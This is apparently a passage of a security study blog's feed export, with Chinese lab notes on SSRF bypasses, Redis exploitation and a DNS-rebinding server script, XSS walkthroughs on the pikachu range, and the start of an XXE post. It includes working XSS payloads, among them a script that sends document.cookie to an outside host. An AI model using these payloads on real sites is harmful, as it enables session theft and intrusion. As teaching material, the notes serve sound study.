<h6 id="gopher-x2F-x2F-：分布式文档传递服务，可使用gopherus生成payload。"><a href="#gopher-x2F-x2F-：分布式文档传递服务，可使用gopherus生成payload。" class="headerlink" title="gopher:&#x2F;&#x2F;：分布式文档传递服务，可使用gopherus生成payload。"></a>gopher:&#x2F;&#x2F;：分布式文档传递服务，可使用gopherus生成payload。</h6><p>这是Internet上面一个非常有名的信息查找系统，它将Internet上面的文件组织成某种索引，很方便地将用户从Internet一处带到另一处，使用tcp70</p>
<p>但是在www出现之后人们使用它的频率就很少了</p>
<p>但是他是SSRF漏洞中最强大的协议</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413231323667.png"
                      alt="image-20230413231323667"
                ></p>
<p>-wite-curlwrappers：使用curl根据打开url数据流</p>
<p>协议格式</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure></div>

<p>使用gopher协议时，回车换行输入%0d%0a，空格输入%20，问号输入%3f，结束符%0d%0a</p>
<p>SSRF漏洞在真实环境中常常去攻击redis、FastCGI等服务</p>
<h4 id="挖掘SSRF漏洞"><a href="#挖掘SSRF漏洞" class="headerlink" title="挖掘SSRF漏洞"></a>挖掘SSRF漏洞</h4><p>只要能对外发起网络请求的地方，就可能存在SSRF漏洞</p>
<p>从远程服务器请求资源（Upload from URL,Import &amp;Export RSS feed)<br>数据库内置功能(Oracle[UTL_HTTP]、MongoDB、MSSQL、Postgres、CouchDB)<br>Webmail 收取其它邮箱邮件（POP3&#x2F;IMAP&#x2F;SMTP)<br>文件处理，编码处理，属性信息处理（ffpmg,ImageMaic，DOCX，PDF，XML处理器）</p>
<h6 id="利用条件：被攻击的服务等没有开启加密传输与鉴权"><a href="#利用条件：被攻击的服务等没有开启加密传输与鉴权" class="headerlink" title="利用条件：被攻击的服务等没有开启加密传输与鉴权"></a>利用条件：被攻击的服务等没有开启加密传输与鉴权</h6><h4 id="redis未授权漏洞的6种利用方法"><a href="#redis未授权漏洞的6种利用方法" class="headerlink" title="redis未授权漏洞的6种利用方法"></a>redis未授权漏洞的6种利用方法</h4><p>可以将恶意文件保存在www目录中</p>
<p>可以创建authorized_keys文件，利用ssh私钥登录服务器</p>
<p>写计划任务(&#x2F;var&#x2F;spool&#x2F;cron&#x2F; &amp; &#x2F;etc&#x2F;cron.d&#x2F;)</p>
<p>slave of 8.8.8.8 主从模式利用</p>
<p>写入到&#x2F;etc&#x2F;profile.d&#x2F; 用户环境变量修改</p>
<p>开启AOF持久化纯文本记录 appendfilename</p>
<h4 id="攻击利用举例"><a href="#攻击利用举例" class="headerlink" title="攻击利用举例"></a>攻击利用举例</h4><p>靶场：pikachu</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412205041999.png"
                      alt="image-20230412205041999"
                ></p>
<p>注意看这有个url说明它有去调用网站中的服务器文件</p>
<p>如果没过滤好的话就会造成SSRF的漏洞</p>
<p>我们就可以试一下修改为这个</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure></div>

<p>意思是利用file:&#x2F;&#x2F;伪协议读取系统中的文件，敏感文件win.ini</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412205836754.png"
                     
                ></p>
<p>这样就可以读取到文件里面的内容</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>一般的代码开发人员不会傻到一点防护都没有，肯定会做一些过滤操作的，这就涉及到绕过</p>
<h6 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h6><p><code>http://www.baidu.com@10.10.10.10</code> 与 <code>http://10.10.10.10</code> 请求是相同的</p>
<p>原理涉及到解析url的规则问题，一般利用url解析导致的SSRF过滤被绕过的基本上都是因为后端通过布阵却的正则表达式对url进行了解析</p>
<p>但是在2017年的黑客大会上介绍了一种全新的方式，就是利用不同编程语言之间对url处理标准来绕过ssrf过滤，从而实施攻击</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412212649561.png"
                      alt="image-20230412212649561"
                ></p>
<p>上面这个图表示了，NodeJS url、Perl URI、Go net&#x2F;url、PHP parser_url 以及 Ruby addressable 这些编程语言是解析为google.com</p>
<p>但是cURL libcurl却解析为evil.com:80</p>
<h6 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h6><p>在浏览器中可以使用不同的分割符号来代替域名中的   .    号，如<code>。 &lt;-有个空格</code> 、 <code>。</code>、 <code>. &lt;-有个空格</code> 来代替</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412213447530.png"
                      alt="image-20230412213447530"
                ></p>
<h6 id="本地回环地址"><a href="#本地回环地址" class="headerlink" title="本地回环地址"></a>本地回环地址</h6><p>127.0.0.1，通常被称为回环地址，指的是本机的虚拟接口，表示方法如下</p>
<p>（ipv6的地址使用http访问需要加[]这个符号）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412213650506.png"
                      alt="image-20230412213650506"
                ></p>
<h6 id="IP地址进制转换"><a href="#IP地址进制转换" class="headerlink" title="IP地址进制转换"></a>IP地址进制转换</h6><p>通常IP地址都是被分割成4个8位的二进制数，一般用点分十进制表示如192.168.3.1，所以IP地址可以用不同的进制表示</p>
<p>IPFuscator工具可以实现IP地址的进制转换</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 IPFuscator.py </span><br></pre></td></tr></table></figure></div>

<p>在脚本对IP地址进行八进制转换的时候，一般会在末尾多一个L</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412214129659.png"
                      alt="image-20230412214129659"
                ></p>
<h6 id="封闭式字母数字"><a href="#封闭式字母数字" class="headerlink" title="封闭式字母数字"></a>封闭式字母数字</h6><p>封闭式字母数字是一个由字母数字组成的 Unicode 印刷符号块，使用这些符号块替换域名中的字母也可以被浏览器接受。在浏览器测试中只有下列单圆圈的字符可用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215200838.png"
                      alt="image-20230412215200838"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215207003.png"
                      alt="image-20230412215207003"
                ></p>
<p>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </p>
<p>在浏览器使用的时候就可以正常识别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215511590.png"
                      alt="image-20230412215511590"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215422527.png"
                      alt="image-20230412215422527"
                ></p>
<h6 id="URL十六进制编码"><a href="#URL十六进制编码" class="headerlink" title="URL十六进制编码"></a>URL十六进制编码</h6><p>URL十六进制编码可以被浏览器正常的识别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412220233457.png"
                      alt="image-20230412220233457"
                ></p>
<h6 id="利用网址缩短"><a href="#利用网址缩短" class="headerlink" title="利用网址缩短"></a>利用网址缩短</h6><p>利用网址缩短的网站进行在线缩短</p>
<p><a class="link"   href="https://www.baidu.com/" >https://www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412220551851.png"
                      alt="image-20230412220551851"
                ></p>
<h6 id="利用30X重定向"><a href="#利用30X重定向" class="headerlink" title="利用30X重定向"></a>利用30X重定向</h6><p>可以利用重定向来让服务器访问目标地址，可用于重定向HTTP状态码：300 301 302 303 304 305 306 307 308</p>
<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可以条状到内网中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">header(&quot;Location: http://192.168.1.10&quot;);</span><br><span class="line">exit(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>具体不太清楚</p>
<h6 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h6><p>配置域名的DNS解析到目标地址如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure></div>

<p>其中还有一个xip.io是一个开源的泛域名服务，会把如下域名解析到特定的地址，和DNS解析差不多</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure></div>

<h6 id="DNS重绑定（DNS-Rebinding）"><a href="#DNS重绑定（DNS-Rebinding）" class="headerlink" title="DNS重绑定（DNS Rebinding）"></a>DNS重绑定（DNS Rebinding）</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413164656866.png"
                      alt="image-20230413164656866"
                ></p>
<p>流程图中：对于用户的请求URL参数，首先服务器端会对其进行dns解析，然后返回解析过的域名，绕过不合法就丢弃，之后还会有一个URL请求</p>
<p>主要的原理就是利用这两次URL请求的时间差，来进行攻击的</p>
<p>利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候访问我们真正想要访问的内网IP就可以了</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名解析指定到我们自己的DNS Server，这样我们才可以编写解析服务，设置TTL时间为0（就是保存缓存的时间为0），这是为了防止有DNS服务器对第一次解析结果进行缓存</p>
<p>攻击流程</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器获得了URL参数，进行了第一次DNS解析，获得了一个非内网的IP</span><br><span class="line">对于获得的IP进行判断，发现这个是指定范围的IP，通过</span><br><span class="line">然后服务器端对URL进行访问，TTL设置为0，所以再次进行DNS解析，返回内网IP</span><br><span class="line">第一次的验证已经绕过，所以服务器端返回的就是内网的资源内容</span><br></pre></td></tr></table></figure></div>

<p>把同一个域名绑定到两个不同的IP地址，这就是两条A记录</p>
<p>但是这种具有随机性，你不太能可控，要取到第一次是外网IP，第二次是内网IP的可能组合有1&#x2F;4的概率</p>
<p>所以还有更好的方法，自己搭建一个DNS服务器</p>
<p>有一个A记录和一个NS记录</p>
<p>NS记录表示域名test.bendawang.site这个指定由ns.bendawang.site这个域名服务器来解析，然后A记录表示ns.bendawang.site的位置在IP104.160.43.154上</p>
<p>这需要我们自己搭建一个dns服务器</p>
<p>采用python的twisted库中的name模块就行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from twisted.internet import reactor, defer</span><br><span class="line">from twisted.names import client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&amp;#123;&amp;#125;</span><br><span class="line"></span><br><span class="line">class DynamicResolver(object):</span><br><span class="line"></span><br><span class="line">    def _doDynamicResponse(self, query):</span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        if name not in record or record[name]&lt;1:</span><br><span class="line">            ip=&quot;104.160.43.154&quot;</span><br><span class="line">        else:</span><br><span class="line">            ip=&quot;171.18.0.2&quot;</span><br><span class="line"></span><br><span class="line">        if name not in record:</span><br><span class="line">            record[name]=0</span><br><span class="line">        record[name]+=1</span><br><span class="line"></span><br><span class="line">        print name+&quot; ===&gt; &quot;+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=0,</span><br><span class="line">            payload=dns.Record_A(address=b&#x27;%s&#x27;%ip,ttl=0)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        return answers, authority, additional</span><br><span class="line"></span><br><span class="line">    def query(self, query, timeout=None):</span><br><span class="line">        return defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=&#x27;/etc/resolv.conf&#x27;)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(53, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    raise SystemExit(main())</span><br></pre></td></tr></table></figure></div>

<p>打包成 .py文件然后运行就行了</p>
<p>然后<code>dig test.bendawang.site</code></p>
<p>有一个在线的URL重绑定工具，第一种方法</p>
<p><code>https://lock.cmpxchg8b.com/rebinder.html</code></p>
<h4 id="SSRF工具"><a href="#SSRF工具" class="headerlink" title="SSRF工具"></a>SSRF工具</h4><h6 id="SSRF-Testing，绕过测试工具"><a href="#SSRF-Testing，绕过测试工具" class="headerlink" title="SSRF-Testing，绕过测试工具"></a>SSRF-Testing，绕过测试工具</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413173902801.png"
                      alt="image-20230413173902801"
                ></p>
<h6 id="SSRFmap"><a href="#SSRFmap" class="headerlink" title="SSRFmap"></a>SSRFmap</h6><p>这个工具可以根据模块来发送exp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413173558180.png"
                      alt="image-20230413173558180"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>XSS漏洞</title>
    <url>/2023/03/08/XSS%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到web网站中，当用户访问到有恶意代码的网页时就会产生xss攻击</p>
<h6 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h6><p>盗取账号，窃取数据，网站挂马，控制计算机等</p>
<h6 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h6><p>对提交的数据进行过滤、对内容进行安全编码等</p>
<h6 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h6><p>反射型 存储型 dom型xss</p>
<script>alert("xss")</script>

<h3 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h3><p>非持久化需要欺骗用户自己去点击链接才能触发，当用户访问时，服务器接收该链接并进行处理，并把带有xss脚本的数据发送给用户浏览器，浏览器解析后，就会触发xss攻击</p>
<h6 id="反射性xss（get）"><a href="#反射性xss（get）" class="headerlink" title="反射性xss（get）"></a>反射性xss（get）</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924140643197.png"
                      alt="image-20220924140643197"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924140738893.png"
                      alt="image-20220924140738893"
                ></p>
<p>注意：攻击过程中会有字数限制，可以对其检查源代码，更改限制字数，或者直接取消限制再输入</p>
<p>输入xss语句就可直接攻击成功</p>
<h6 id="反射型xss（post）"><a href="#反射型xss（post）" class="headerlink" title="反射型xss（post）"></a>反射型xss（post）</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924141519304.png"
                      alt="image-20220924141519304"
                ></p>
<p>直接查看提示输入密码，即可输入，提交即可（无字数限制）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924141557125.png"
                      alt="image-20220924141557125"
                ></p>
<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>是由于代码是存储再服务器中的数据库里，比如个人信息，或者留言板，发表文章或评论的地方都可插入代码，如果过滤不严，用户访问该页面的时候就会触发代码执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924143304929.png"
                      alt="image-20220924143304929"
                ></p>
<p>直接攻击即可</p>
<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>DOM,是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构和样式，没有与服务器进行交互</p>
<p>原理：客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM数据并在本地执行。基于这个特性，就可以利用JS脚本来实现xss攻击（特殊的反射型xss漏洞）</p>
<h6 id="经常出现dom-xss的关键语句："><a href="#经常出现dom-xss的关键语句：" class="headerlink" title="经常出现dom xss的关键语句："></a>经常出现dom xss的关键语句：</h6><p>​       document.referer属性</p>
<p>​       window.name属性</p>
<p>​       location属性</p>
<p>​       innerHTML属性</p>
<p>​       documen.write属性</p>
<p>通过分析代码可得</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924151730303.png"
                      alt="image-20220924151730303"
                ></p>
<p>所以我们可以利用语句拼接进行过滤</p>
<p>在其中加入</p>
<p>#’ onclick&#x3D;”alert(111)”即可构造payload</p>
<p>或者使用javascript:alert(”xss“)即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924152020554.png"
                      alt="image-20220924152020554"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924152116336.png"
                      alt="image-20220924152116336"
                ></p>
<h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924152941061.png"
                      alt="image-20220924152941061"
                ></p>
<h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>在留言框中输入语句，并提交管理员视角中你的代码会生效</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924154934265.png"
                      alt="image-20220924154934265"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924155127889.png"
                      alt="image-20220924155127889"
                ></p>
<h3 id="xss过滤"><a href="#xss过滤" class="headerlink" title="xss过滤"></a>xss过滤</h3><p>正常输入<script>alert("xss")</script>语句发现被过滤掉了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924165211551.png"
                      alt="image-20220924165211551"
                ></p>
<p>输入&lt;script,发现被完全过滤，说明可能过滤了<script>语句，那咱们换一个</p>
<p>输入<a herf="#" onclick="alert('xss')">发现成功了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924173150950.png"
                      alt="image-20220924173150950"
                ></p>
<p>或者输入<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:/myblog/source/_posts/x"
                      onerror="alert('xss')"
                >也是一样的结果</p>
<h3 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h3><p>htmlspecialchars()函数把预定义的字符转换为HTML实体</p>
<ul>
<li>& （和号）成为 &amp;</li>
<li>" （双引号）成为 &quot;</li>
<li>' （单引号）成为 '</li>
<li>< （小于）成为 &lt;</li>
<li>&gt; （大于）成为 &gt;</li>
</ul>
<p>正常输入<script>alert("xss")</script>发现只有一个链接生成，所以可能是被a标签包含了，查看源码发现果然是a标签，而且&lt;&gt;符号也被过滤掉了，所以不能构造闭合</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925104552389.png"
                      alt="image-20220925104552389"
                ></p>
<p>构造payload，#’ onclick&#x3D;’alert(“xss”)’   出现弹窗</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925105822983.png"
                      alt="image-20220925105822983"
                ></p>
<h3 id="xss-herf"><a href="#xss-herf" class="headerlink" title="xss-herf"></a>xss-herf</h3><p>输入<script>alert("xss")</script>发现&gt;&lt;””全被过滤掉了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925110411280.png"
                      alt="image-20220925110411280"
                ></p>
<p>且在a标签的herf中，herf的值可以是URL，也可以执行javascript语句，所以输入javascript:alert(“xss”)试试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925110734950.png"
                      alt="image-20220925110734950"
                ></p>
<p>出现弹窗，攻击成功</p>
<h3 id="xss-js"><a href="#xss-js" class="headerlink" title="xss-js"></a>xss-js</h3><p>输入<script>alert("xss")</script>没反应，查看源码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925111416059.png"
                      alt="image-20220925111416059"
                ></p>
<p><img src="C:\Users\hc\AppData\Roaming\Typora\typora-user-images\image-20220925111503616.png" alt="![](https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925111503616.png)"></p>
<p>发现你输入的语句被传到<script>标签中了，这几可以直接构造语句';alert("xss")//</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925111803641.png"
                      alt="image-20220925111803641"
                ></p>
<p>分析源码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:/Users/hc/Desktop/1.jpg"
                     
                ></p>
<p>攻击成功</p>
<p>至此，pikachu靶场的全部xss漏洞都已经通关</p>
<h3 id="xss测试语句"><a href="#xss测试语句" class="headerlink" title="xss测试语句"></a>xss测试语句</h3><p>在网站中要验证是否存在xss漏洞，要输入一些标签如< >等，如果没有被过滤，则有着很大的可能存在xss漏洞</p>
<p>常用的测试语句</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h5&gt;1&lt;/h5&gt;</span><br><span class="line">&lt;span&gt;1&lt;/span&gt;</span><br><span class="line">&lt;a herf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure></div>

<p>语句闭合</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&quot;</span><br><span class="line">&#x27;&gt;&quot;&gt;&lt;span&gt;x&lt;.span&gt;&lt;&#x27;</span><br></pre></td></tr></table></figure></div>

<p>单行注释 //</p>
<h3 id="xss攻击语句"><a href="#xss攻击语句" class="headerlink" title="xss攻击语句"></a>xss攻击语句</h3><p>测试过后，确定具有xss漏洞，就可以构造攻击语句</p>
<p>常用语句</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;</span><br><span class="line">&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure></div>

<p>普通的xss    javascript注入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=http://3w.org/xss.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>IMG标签xss使用javascript命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IMG src=http://3w.org/xss.js/&gt;</span><br></pre></td></tr></table></figure></div>



<h3 id="xss常见利用"><a href="#xss常见利用" class="headerlink" title="xss常见利用"></a>xss常见利用</h3><p>xss可以实现很多功能，最重要的是可以构造xss漏洞去获取对方的cookie</p>
<p>获取网页cookie</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">js文件</span><br><span class="line">var img=document.createElement(&quot;img&quot;);</span><br><span class="line">img.src=&quot;http://www.xxx.com?&quot;+escape(document.cookie);</span><br><span class="line">document.body.appendChild(img);</span><br><span class="line"></span><br><span class="line">传输上面的js文件</span><br><span class="line">&lt;script.src=&quot;http://192.168.0.121/xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>



<p>攻击语句</p>
<p>'onfocus=javascript:alert('xss') > //</p>
<h3 id="http-only"><a href="#http-only" class="headerlink" title="http only"></a>http only</h3><p>开启http only后可有效的拦截xss获取cookie攻击，这样js脚本就不能获取到用户的cookie信息了（仅仅只能防止cookie被盗取）</p>
]]></content>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2023/05/15/XXE/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221012145304519.png"
                      alt="image-20221012145304519"
                ></p>
<h2 id="XML和XXE区别"><a href="#XML和XXE区别" class="headerlink" title="XML和XXE区别"></a>XML和XXE区别</h2><p>XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。</p>
<p>XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害</p>
<h2 id="XML和HTML的区别"><a href="#XML和HTML的区别" class="headerlink" title="XML和HTML的区别"></a>XML和HTML的区别</h2><p>XML 与 HTML 的主要差异：XML 被设计为传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息 ，而 XML 旨在传输信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415110401137.png"
                      alt="image-20230415110401137"
                ></p>
<p>XML文档有自己的格式规范，由一个叫做DTD的东西控制的</p>
<p>如</p>
